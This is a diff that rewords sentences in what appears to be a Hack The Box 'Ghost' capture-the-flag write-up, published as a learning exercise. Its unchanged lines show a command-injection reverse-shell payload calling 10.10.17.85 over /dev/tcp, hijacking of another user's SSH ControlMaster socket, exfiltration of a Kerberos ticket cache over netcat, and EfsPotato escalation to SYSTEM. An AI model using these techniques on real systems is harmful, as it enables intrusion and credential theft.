@@ -159,7 +159,7 @@ pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
         .output();
 ```
 
-`data.url` goes directly into a bash command string with zero sanitization. The `DevGuard` just checks for the `X-Dev-Intranet-Key` header, which I had. Tested it:
+`data.url` goes directly into a bash command string with zero sanitization. The `DevGuard` just checks for the `X-Dev-Intranet-Key` header, which I had. So I tested it:
 
 ```bash
 POST /api-dev/scan HTTP/1.1
@@ -172,7 +172,7 @@ Content-Type: application/json
 
 ![Burp showing RCE response with uid=0(root) from command injection](/images/writeups/htb-ghost/command-injection-rce.png)
 
-Running as root inside the container. Got a shell:
+Running as root inside the container. Got a shell going:
 
 ```bash
 {"url": "http://example.com; bash -i >& /dev/tcp/10.10.17.85/9999 0>&1"}
@@ -203,7 +203,7 @@ ls -la /root/.ssh/controlmaster/
 srw------- 1 root root 0 Jun 18 22:43 florence.ramirez@ghost.htb@dev-workstation:22
 ```
 
-There was an active socket for `florence.ramirez`. Hijacked it:
+There was an active socket sitting there for `florence.ramirez`. All I had to do was point SSH at it and the session was already authenticated:
 
 ```bash
 ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \
@@ -224,7 +224,7 @@ krbtgt/GHOST.HTB@GHOST.HTB
   Valid starting: 06/19/26 01:46:02  Expires: 06/19/26 11:46:02
 ```
 
-Exfiltrated the ccache over netcat:
+I needed that ccache file off the machine. Simplest thing was to base64 it and pipe it over netcat:
 
 ```bash
 # on my machine
@@ -363,7 +363,7 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
 [!] process with pid: 1060 created.
 ```
 
-SYSTEM on `PRIMARY.corp.ghost.htb`.
+SYSTEM on `PRIMARY.corp.ghost.htb`. Corp domain is done.
 
 ### Cross-Forest Golden Ticket
 
